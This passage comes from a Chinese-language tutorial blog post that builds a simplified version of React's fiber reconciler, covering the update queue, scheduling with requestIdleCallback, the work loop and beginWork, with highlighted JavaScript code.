if(fiber.sibling) {</span></span><br><span class=\"line\"><span class=\"string\">            return fiber.sibling;</span></span><br><span class=\"line\"><span class=\"string\">        }</span></span><br><span class=\"line\"><span class=\"string\">        // 否则就返回上一层</span></span><br><span class=\"line\"><span class=\"string\">        fiber = fiber.return;</span></span><br><span class=\"line\"><span class=\"string\">    }</span></span><br><span class=\"line\"><span class=\"string\">}</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">function beginWork(fiber) {</span></span><br><span class=\"line\"><span class=\"string\">    console.log('</span>beginWork<span class=\"string\">', fiber.props.className);</span></span><br><span class=\"line\"><span class=\"string\">    // 执行完成后返回第一个子节点</span></span><br><span class=\"line\"><span class=\"string\">    return fiber.child;</span></span><br><span class=\"line\"><span class=\"string\">}</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">function completeUnitOfWork(fiber) {</span></span><br><span class=\"line\"><span class=\"string\">    // 标记当前这个fiber街道已经完成</span></span><br><span class=\"line\"><span class=\"string\">    console.log('</span>completeUnitOfWork<span class=\"string\">', fiber.props.className);</span></span><br><span class=\"line\"><span class=\"string\">}</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>上面的这些代码是预先熟悉一下，fiber 是怎么运行，下面正式进入构建的代码逻辑。</p>\n<h4 id=\"队列的单向链表\"><a href=\"#队列的单向链表\" class=\"headerlink\" title=\"队列的单向链表\"></a>队列的单向链表</h4><ol>\n<li><p>在 main.js 中增加下面代码</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">root.<span class=\"title function_\">render</span>(element)</span><br></pre></td></tr></tbody></table></figure>\n</li>\n<li><p>ReactDOMRoot.js</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> { updateContainer } <span class=\"keyword\">from</span> <span class=\"string\">'../react-reconciler/src/ReactFiberReconciler'</span>;</span><br><span class=\"line\">...</span><br><span class=\"line\"><span class=\"title class_\">ReactDomRoot</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>.<span class=\"property\">render</span> = <span class=\"keyword\">function</span> (<span class=\"params\">children</span>) {</span><br><span class=\"line\"><span class=\"comment\">// 1. 获取容器</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> root = <span class=\"variable language_\">this</span>.<span class=\"property\">_internalRoot</span>;</span><br><span class=\"line\"><span class=\"title function_\">updateContainer</span>(children, root);</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n</li>\n<li><p>ReactFiberReconciler.js</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> { createUpdate, enqueueUpdate } <span class=\"keyword\">from</span> <span class=\"string\">'./ReactFiberClassUpdateQueue'</span>;</span><br><span class=\"line\">...</span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 更新容器, 把虚拟DOM变成真实DOM 插入到container容器中</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> {<span class=\"type\">*</span>} element 虚拟DOM</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> {<span class=\"type\">*</span>} container 容器   FiberRootNode</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">function</span> <span class=\"title function_\">updateContainer</span>(<span class=\"params\">element, container</span>) {</span><br><span class=\"line\"><span class=\"comment\">// 获取根fiber</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> current = container.<span class=\"property\">current</span>;</span><br><span class=\"line\"><span class=\"comment\">// 创建更新队列</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> update = <span class=\"title function_\">createUpdate</span>();</span><br><span class=\"line\">update.<span class=\"property\">payload</span> = {element};</span><br><span class=\"line\"><span class=\"comment\">// 3. 把此更新任务对象添加到current这个根Fiber的更新队列里</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> root = <span class=\"title function_\">enqueueUpdate</span>(current, update);</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(root);</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n</li>\n<li><p>ReactFiberClassUpdateQueue.js</p>\n</li>\n</ol>\n<p><img data-src=\"https://pic.imgdb.cn/item/653e40f6c458853aefe48306.jpg\" alt=\"ReactFiberClassUpdateQueue.js\"></p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> { markUpdateLaneFromFiberToRoot } <span class=\"keyword\">from</span> <span class=\"string\">'./ReactFiberConcurrentUpdate'</span></span><br><span class=\"line\">...</span><br><span class=\"line\"><span class=\"comment\">// 更新状态</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> <span class=\"title class_\">UpdateState</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">function</span> <span class=\"title function_\">createUpdate</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"keyword\">const</span> update = {<span class=\"attr\">tag</span>: <span class=\"title class_\">UpdateState</span>};</span><br><span class=\"line\">    <span class=\"keyword\">return</span> update;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">function</span> <span class=\"title function_\">enqueueUpdate</span>(<span class=\"params\">fiber, update</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// 获取根fiber的更新队列 (上一篇最后加的)</span></span><br><span class=\"line\">    <span class=\"keyword\">const</span> updateQueue = fiber.<span class=\"property\">updateQueue</span>;</span><br><span class=\"line\">    <span class=\"comment\">// 获取等待执行的任务</span></span><br><span class=\"line\">    <span class=\"keyword\">const</span> pending = updateQueue.<span class=\"property\">shared</span>.<span class=\"property\">pending</span>;</span><br><span class=\"line\">    <span class=\"comment\">// 说明初始化的状态</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(pending === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">        update.<span class=\"property\">next</span> = update;</span><br><span class=\"line\">    } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">        update.<span class=\"property\">next</span> = pending.<span class=\"property\">next</span>;</span><br><span class=\"line\">        pending.<span class=\"property\">next</span> = update;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 让等待更新指向当前update 开始更新</span></span><br><span class=\"line\">    updateQueue.<span class=\"property\">shared</span>.<span class=\"property\">pending</span> = update;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 从当前的fiber 到返回找到并返回根节点</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_\">markUpdateLaneFromFiberToRoot</span>(fiber);</span><br><span class=\"line\"></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<h4 id=\"冒泡获取根节点容器\"><a href=\"#冒泡获取根节点容器\" class=\"headerlink\" title=\"冒泡获取根节点容器\"></a>冒泡获取根节点容器</h4><p>ReactFiberConcurrentUpdate.js</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> { <span class=\"title class_\">HostRoot</span> } <span class=\"keyword\">from</span> <span class=\"string\">'./ReactWorkTags'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 本来此文件要处理更新优先级问题，把不同的fiber优先级冒泡一路标记到根节点。</span></span><br><span class=\"line\"><span class=\"comment\"> * 目前现在值实现向上冒泡找到根节点</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> {<span class=\"type\">*</span>} <span class=\"variable\">sourceFiber</span></span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">function</span> <span class=\"title function_\">markUpdateLaneFromFiberToRoot</span>(<span class=\"params\">sourceFiber</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// 当前父fiber</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> parent = sourceFiber.<span class=\"property\">return</span>;</span><br><span class=\"line\">    <span class=\"comment\">// 当前fiber</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> node = sourceFiber;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 一直找到 父fiber 为null</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span>(parent !== <span class=\"literal\">null</span>) {</span><br><span class=\"line\">        node = parent;</span><br><span class=\"line\">        parent = parent.<span class=\"property\">return</span>;</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\">// 返回当前root节点</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(node.<span class=\"property\">tag</span> === <span class=\"title class_\">HostRoot</span>) {</span><br><span class=\"line\">        <span class=\"keyword\">const</span> root = node.<span class=\"property\">stateNode</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> root;</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<h4 id=\"调度更新\"><a href=\"#调度更新\" class=\"headerlink\" title=\"调度更新\"></a>调度更新</h4><p>到目前为止更新对象已经添加到了根 fiber 的更新队列上，现在需要开始进行调度更新。</p>\n<ol>\n<li><p>ReactFiberReconciler.js</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> { scheduleUpdateOnFiber } <span class=\"keyword\">from</span> <span class=\"string\">'./ReactFiberWorkLoop'</span></span><br><span class=\"line\">...</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">function</span> <span class=\"title function_\">updateContainer</span>(<span class=\"params\">element, container</span>) {</span><br><span class=\"line\">...</span><br><span class=\"line\">+ <span class=\"title function_\">scheduleUpdateOnFiber</span>(root);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n</li>\n<li><p>ReactFiberWorkLoop.js</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> { scheduleCallback } <span class=\"keyword\">from</span> <span class=\"string\">'./scheduler'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">function</span> <span class=\"title function_\">scheduleUpdateOnFiber</span>(<span class=\"params\">root</span>) {</span><br><span class=\"line\">    <span class=\"title function_\">ensureRootIsScheduled</span>(root);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">function</span> <span class=\"title function_\">ensureRootIsScheduled</span>(<span class=\"params\">root</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// 告诉浏览器要执行performConcurrentWorkOnRoot 参数定死为root</span></span><br><span class=\"line\">    <span class=\"title function_\">scheduleCallback</span>(performConcurrentWorkOnRoot.<span class=\"title function_\">bind</span>(<span class=\"literal\">null</span>, root));</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">performConcurrentWorkOnRoot</span>(<span class=\"params\">root</span>) {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(root, <span class=\"string\">'performConcurrentWorkOnRoot'</span>);</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n</li>\n<li><p>src/scheduler/index.js</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">export</span> * <span class=\"keyword\">from</span> <span class=\"string\">'./src/forks/Scheduler'</span>;</span><br></pre></td></tr></tbody></table></figure>\n</li>\n<li><p>src/forks/Scheduler.js</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 此处后面会实现优先级队列</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">function</span> <span class=\"title function_\">scheduleCallback</span>(<span class=\"params\">callback</span>) {</span><br><span class=\"line\"><span class=\"title function_\">requestIdleCallback</span>(callback);</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n</li>\n<li><p>打印 FiberRootNode</p>\n</li>\n</ol>\n<p><img data-src=\"https://pic.imgdb.cn/item/653e496bc458853aef00deb1.jpg\" alt=\"输出的FiberRootNode\"></p>\n<h3 id=\"工作循环\"><a href=\"#工作循环\" class=\"headerlink\" title=\"工作循环\"></a>工作循环</h3><p><img data-src=\"https://pic.imgdb.cn/item/653e4d86c458853aef11c6ea.jpg\" alt=\"工作循环\"></p>\n<p>我们已经创建好一个根节点容器和一个空的根 fiber（黑色部分），在图中看到还有一个正在构建中的根 fiber。<br>根节点的 current 指的是当前的根 fiber，是会和构建中的根 fiber 轮替工作（双缓冲），现在需要构建一个新的根 fiber 并且把 fiber 树写在里面。<br>一个是表示当前页面已经渲染完成的 fiber 树，一个是正在构建中还没有生效、更没有更新到页面的 fiber 树</p>\n<h4 id=\"建立新的hostRootFiber\"><a href=\"#建立新的hostRootFiber\" class=\"headerlink\" title=\"建立新的hostRootFiber\"></a>建立新的 hostRootFiber</h4><ol>\n<li><p>ReactFiberWorkLoop.js</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> { creatWorkInProgress } <span class=\"keyword\">from</span> <span class=\"string\">\"./ReactFiber\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 正在进行中的工作</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> workInProgress = <span class=\"literal\">null</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//...</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * (被告知浏览器确保执行的函数)</span></span><br><span class=\"line\"><span class=\"comment\"> * 根据当前的fiber节点构建fiber树, 创建真实的dom节点, 插入到容器</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> {<span class=\"type\">*</span>} <span class=\"variable\">root</span></span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">performConcurrentWorkOnRoot</span>(<span class=\"params\">root</span>) {</span><br><span class=\"line\"><span class=\"comment\">// 1. 初次渲染的时候以同步方式渲染根节点, 因为要尽快展示 (初始化)</span></span><br><span class=\"line\"><span class=\"title function_\">renderRootSync</span>(root);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">prepareFreshStack</span>(<span class=\"params\">root</span>) {</span><br><span class=\"line\"><span class=\"comment\">// 5. 根据老fiber构建新fiber (初始化)</span></span><br><span class=\"line\">workInProgress = <span class=\"title function_\">creatWorkInProgress</span>(root.<span class=\"property\">current</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">renderRootSync</span>(<span class=\"params\">root</span>) {</span><br><span class=\"line\"><span class=\"comment\">// 2. 先构建了一个空的栈</span></span><br><span class=\"line\"><span class=\"title function_\">prepareFreshStack</span>(root);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n</li>\n<li><p>ReactFiber.js</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 根据老fiber和新的属性构建新fiber</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> {<span class=\"type\">*</span>} current 老fiber</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> {<span class=\"type\">*</span>} pendingProps 新的属性</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">function</span> <span class=\"title function_\">creatWorkInProgress</span>(<span class=\"params\">current, pendingProps</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// 3. 拿到老fiber的轮替 第一次没有 (初始化)</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> workInProgress = current.<span class=\"property\">alternate</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(workInProgress === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">        workInProgress = <span class=\"title function_\">createFiberNode</span>(current.<span class=\"property\">tag</span>, pendingProps, current.<span class=\"property\">key</span>);</span><br><span class=\"line\">        workInProgress.<span class=\"property\">type</span> = current.<span class=\"property\">type</span>;</span><br><span class=\"line\">        workInProgress.<span class=\"property\">stateNode</span> = current.<span class=\"property\">stateNode</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        workInProgress.<span class=\"property\">stateNode</span> = current;</span><br><span class=\"line\">        current.<span class=\"property\">alternate</span> =  workInProgress;</span><br><span class=\"line\">    } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">        <span class=\"comment\">// 如果有，说明是更新，只能改属性就可以复用</span></span><br><span class=\"line\">        workInProgress.<span class=\"property\">pendingProps</span> = current.<span class=\"property\">pendingProps</span>;</span><br><span class=\"line\">        workInProgress.<span class=\"property\">type</span> = current.<span class=\"property\">type</span>;</span><br><span class=\"line\">        workInProgress.<span class=\"property\">flags</span> = current.<span class=\"property\">flags</span>;</span><br><span class=\"line\">        workInProgress.<span class=\"property\">subtreeFlags</span> = <span class=\"title class_\">NoFlags</span>;</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\">// 复制属性</span></span><br><span class=\"line\">    workInProgress.<span class=\"property\">child</span> = current.<span class=\"property\">child</span>;</span><br><span class=\"line\">    workInProgress.<span class=\"property\">memoizedProps</span> = current.<span class=\"property\">memoizedProps</span>;</span><br><span class=\"line\">    workInProgress.<span class=\"property\">memoizedState</span> = current.<span class=\"property\">memoizedState</span>;</span><br><span class=\"line\">    workInProgress.<span class=\"property\">updateQueue</span> = current.<span class=\"property\">updateQueue</span>;</span><br><span class=\"line\">    workInProgress.<span class=\"property\">sibling</span> = current.<span class=\"property\">sibling</span>;</span><br><span class=\"line\">    workInProgress.<span class=\"property\">index</span> = current.<span class=\"property\">index</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> workInProgress;</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure></li>\n</ol>\n<h4 id=\"执行工作单元\"><a href=\"#执行工作单元\" class=\"headerlink\" title=\"执行工作单元\"></a>执行工作单元</h4><p>然后在新的根 fiber 里构建更新 fiber 树</p>\n<ol>\n<li><p>ReactFiberWorkLoop.js</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> { beginWork } <span class=\"keyword\">from</span> <span class=\"string\">\"./ReactFiberBeginWork\"</span>;</span><br><span class=\"line\">...</span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">renderRootSync</span>(<span class=\"params\">root</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// 2. 先构建一个空的栈</span></span><br><span class=\"line\">    <span class=\"title function_\">prepareFreshStack</span>(root);</span><br><span class=\"line\">    <span class=\"comment\">// 1. 现在的 workInProgress 是新的根fiber</span></span><br><span class=\"line\">    <span class=\"title function_\">workLoopSync</span>();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 工作同步循环</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">workLoopSync</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(workInProgress !== <span class=\"literal\">null</span>) {</span><br><span class=\"line\">        <span class=\"comment\">// 2. 执行工作单元</span></span><br><span class=\"line\">        <span class=\"title function_\">performUnitOfWork</span>(workInProgress);</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">performUnitOfWork</span>(<span class=\"params\">unitOfWork</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">const</span> current = unitOfWork.<span class=\"property\">alternate</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">const</span> next = <span class=\"title function_\">beginWork</span>(current, unitOfWork);</span><br><span class=\"line\"></span><br><span class=\"line\">    unitOfWork.<span class=\"property\">memoizedProps</span> = unitOfWork.<span class=\"property\">pendingProps</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(next === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">        <span class=\"comment\">// 说明已经完成</span></span><br><span class=\"line\">        <span class=\"comment\">// 完成工作单元</span></span><br><span class=\"line\">        <span class=\"comment\">// completeUnitOfWork(); // 这个方法之后写 先模拟一下完成工作</span></span><br><span class=\"line\">        workInProgress = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">        <span class=\"comment\">// 如果有子节点就成为下一个工作单元</span></span><br><span class=\"line\">        workInProgress = next;</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n</li>\n<li><p>ReactFiberBeginWork.js</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> { <span class=\"title class_\">HostComponent</span>, <span class=\"title class_\">HostRoot</span>, <span class=\"title class_\">HostText</span> } <span class=\"keyword\">from</span> <span class=\"string\">\"./ReactWorkTags\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> { processUpdateQueue } <span class=\"keyword\">from</span> <span class=\"string\">'./ReactFiberClassUpdateQueue'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 5. 根据 `新的` 虚拟dom去构建  `新的` fiber链表</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> {<span class=\"type\">*</span>} current 老fiber</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> {<span class=\"type\">*</span>} workInProgress 新fiber</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@returns</span> 下一个工作单元</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">function</span> <span class=\"title function_\">beginWork</span>(<span class=\"params\">current, workInProgress</span>) {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"beginWork\"</span>, workInProgress);</span><br><span class=\"line\">    <span class=\"comment\">// 判断类型不同处理方式返回子节点或者弟弟</span></span><br><span class=\"line\">    <span class=\"keyword\">switch</span>(workInProgress.<span class=\"property\">tag</span>) {</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"title class_\">HostRoot</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"title function_\">updateHostRoot</span>(current, workInProgress);</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"title class_\">HostComponent</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"title function_\">updateHostComponent</span>(current, workInProgress);</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"title class_\">HostText</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"attr\">default</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">updateHostRoot</span>(<span class=\"params\">current, workInProgress</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// 需要知道它的子虚拟dom, 知道它的儿子的虚拟dom信息</span></span><br><span class=\"line\">    <span class=\"comment\">// 之前在根fiber的更新队列加的虚拟dom, 可以在这获取</span></span><br><span class=\"line\">    <span class=\"title function_\">processUpdateQueue</span>(workInProgress);</span><br><span class=\"line\">    <span class=\"keyword\">const</span> nextState = workInProgress.<span class=\"property\">memoizedState</span>;</span><br><span class=\"line\">    <span class=\"comment\">// 获取虚拟节点</span></span><br><span class=\"line\">    <span class=\"keyword\">const</span> nextChildren = nextState.<span class=\"property\">element</span>;</span><br><span class=\"line\">    <span class=\"title function_\">reconcileChildren</span>(current, workInProgress, nextChildren);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> workInProgress.<span class=\"property\">child</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">updateHostComponents</span>(<span class=\"params\">current, workInProgress</span>) {}</span><br></pre></td></tr></tbody></table></figure></li>\n</ol>\n<h4 id=\"获取更新队列的虚拟dom\"><a href=\"#获取更新队列的虚拟dom\" class=\"headerlink\" title=\"获取更新队列的虚拟dom\"></a>获取更新队列的虚拟 dom</h4><p>写上一步引入的 <code>processUpdateQueue</code> 方法</p>\n<ol>\n<li>ReactFiberClassUpdateQueue.js<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> { markUpdateLaneFromFiberToRoot } <span class=\"keyword\">from</span> <span class=\"string\">'./ReactFiberConcurrentUpdate'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">function</span> <span class=\"title function_\">initialUpdateQueue</span>(<span class=\"params\">fiber</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// 创建一个更新队列</span></span><br><span class=\"line\">    <span class=\"comment\">// pending 是循环链表</span></span><br><span class=\"line\">    <span class=\"keyword\">const</span> queue = {</span><br><span class=\"line\">        <span class=\"attr\">shared</span>: {</span><br><span class=\"line\">            <span class=\"attr\">pending</span>: <span class=\"literal\">null</span>,</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">    fiber.<span class=\"property\">updateQueue</span> = queue;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 更新状态</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> <span class=\"title class_\">UpdateState</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">function</span> <span class=\"title function_\">createUpdate</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"keyword\">const</span> update = {<span class=\"attr\">tag</span>: <span class=\"title class_\">UpdateState</span>};</span><br><span class=\"line\">    <span class=\"keyword\">return</span> update;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">function</span> <span class=\"title function_\">enqueueUpdate</span>(<span class=\"params\">fiber, update</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// 获取根fiber的更新队列 (上一篇最后加的)</span></span><br><span class=\"line\">    <span class=\"keyword\">const</span> updateQueue = fiber.<span class=\"property\">updateQueue</span>;</span><br><span class=\"line\">    <span class=\"comment\">// 获取等待执行的任务</span></span><br><span class=\"line\">    <span class=\"keyword\">const</span> pending = updateQueue.<span class=\"property\">shared</span>.<span class=\"property\">pending</span>;</span><br><span class=\"line\">    <span class=\"comment\">// 说明初始化的状态</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(pending === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">        update.<span class=\"property\">next</span> = update;</span><br><span class=\"line\">    } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">        update.<span class=\"property\">next</span> = pending.<span class=\"property\">next</span>;</span><br><span class=\"line\">        pending.<span class=\"property\">next</span> = update;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 让等待更新指向当前update 开始更新</span></span><br><span class=\"line\">    updateQueue.<span class=\"property\">shared</span>.<span class=\"property\">pending</span> = update;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 从当前的fiber 到返回找到并返回根节点</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_\">markUpdateLaneFromFiberToRoot</span>(fiber);</span><br><span class=\"line\"></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 根据老状态和更新队列的更新计算最新的状态</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> {<span class=\"type\">*</span>} workInProgress 要计算的fiber</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">function</span> <span class=\"title function_\">processUpdateQueue</span>(<span class=\"params\">workInProgress</span>) {</span><br><span class=\"line\">    <span 